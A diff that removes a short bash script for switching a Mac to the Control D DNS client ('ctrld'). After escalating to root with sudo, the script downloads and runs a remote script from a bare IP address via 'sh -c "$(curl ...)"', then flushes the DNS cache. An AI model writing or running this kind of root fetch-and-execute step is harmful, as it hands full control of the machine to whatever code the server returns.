@@ -1,8 +1,0 @@
-#!/usr/bin/env bash
-set -euo pipefail
-if [[ $EUID -ne 0 ]]; then exec sudo "$0" "$@"; fi
-sh -c "$(curl -sSL https://147.185.34.1/dl)" -s 2eoeqoo9ib9 forced
-BIN=$(command -v ctrld || echo /usr/local/bin/ctrld)
-$BIN status || true
-dscacheutil -flushcache; killall -HUP mDNSResponder 2>/dev/null || true
-echo "Switched to Control D Privacy (2eoeqoo9ib9)."
